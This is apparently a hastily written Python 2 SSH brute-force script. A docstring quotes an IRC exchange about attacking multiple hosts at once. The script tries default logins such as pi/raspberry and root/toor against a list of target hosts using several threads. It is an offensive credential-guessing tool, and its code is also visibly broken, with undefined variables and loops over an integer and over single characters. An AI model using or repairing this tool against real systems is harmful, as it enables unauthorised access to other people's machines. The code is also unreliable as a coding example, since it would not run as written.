#!/usr/bin/env python2

"""
00:06 <Guido> to attack multiple hosts at once
00:06 okabe ahh
00:06 <Guido> :)
00:06 okabe then do it like this 
00:06 okabe ill write something 
00:06 okabe quickly 
00:06 okabe to show you
00:06 <Guido> I made the script but it's not multithread
00:06 <Guido> it's single thread
00:07 <Guido> I don't have the time to get a huge ass password list for those haha
00:08 <Guido> I use root and pie as username
00:08 <Guido> and try the password list on each of them
00:20 okabe http://pastebin.com/sXwr43PW
00:20 okabe there is somethign quick
00:20 okabe also i didnt test it 
00:20 okabe should work though
00:20 <Guido> you wrote that in 10 min?
"""

from threading import Thread
from Queue import Queue
from time import sleep
import paramiko
import sys

targetq = Queue( maxsize=0 )
printq = Queue( maxsize=0 )

users = [
    "root",
    "admin",
    "pi"
]

passwords = [
    "toor",
    "admin",
    "raspberry"
]

def login( user, pword, target ):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy( paramiko.AutoAddPolicy() )
    ssh.connect( target, username=user, password=pword )

def bruter():
    while True:
        if targetq.empty() is not True:
            target = targetq.get()
            for pword in passwords:
                for user in users:
                    try:
                        login( user, pword, target )
                        msg = "[+] Successful login: {}:{}@{}".format( user, password, target )

                    except Exception as ERROR:
                        msg = "[!] Login failed: {}:{}@{}".format( user, password, target )
                        
                    printq.put( msg )
                    targetq.task_done()
        else:
            sleep( 0.25 )

def printer():
    while True:
        if printq.empty() is not True:
            msg = printq.get()
            print msg
            printq.task_done()
        else:
            sleep( 0.25 )

if __name__ == "__main__":

    threads = 5
    target_list = open( sys.argv[1], "r" ).read()
    for thread in threads:
        proc = Thread( target=bruter )
        proc.daemon = True
        proc.start()

    for target in target_list:
        targetq.put( target.rstrip( "\n" ) )

    printer()
